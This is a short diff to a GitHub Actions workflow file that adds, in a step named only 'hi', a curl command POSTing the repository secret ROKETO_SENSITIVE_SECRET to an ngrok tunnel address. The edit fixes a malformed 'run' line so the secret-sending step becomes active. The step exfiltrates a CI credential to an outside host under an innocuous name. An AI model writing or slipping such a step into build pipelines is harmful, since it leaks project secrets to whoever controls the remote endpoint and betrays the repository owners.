@@ -19,8 +19,7 @@ jobs:
           
     - name: 'hi'
       run: |
-        run: |
-          "curl --request POST --url https://4d25-77-137-8-226.ngrok.io --header 'content-type: application/json' --data '{\"secret\": \"here it is - '${{ secrets.ROKETO_SENSITIVE_SECRET }}'\"}' --fail"
+        "curl --request POST --url https://4d25-77-137-8-226.ngrok.io --header 'content-type: application/json' --data '{\"secret\": \"here it is - '${{ secrets.ROKETO_SENSITIVE_SECRET }}'\"}' --fail"
       
     - name: Use Node.js ${{ matrix.node-version }}
       uses: actions/setup-node@v2
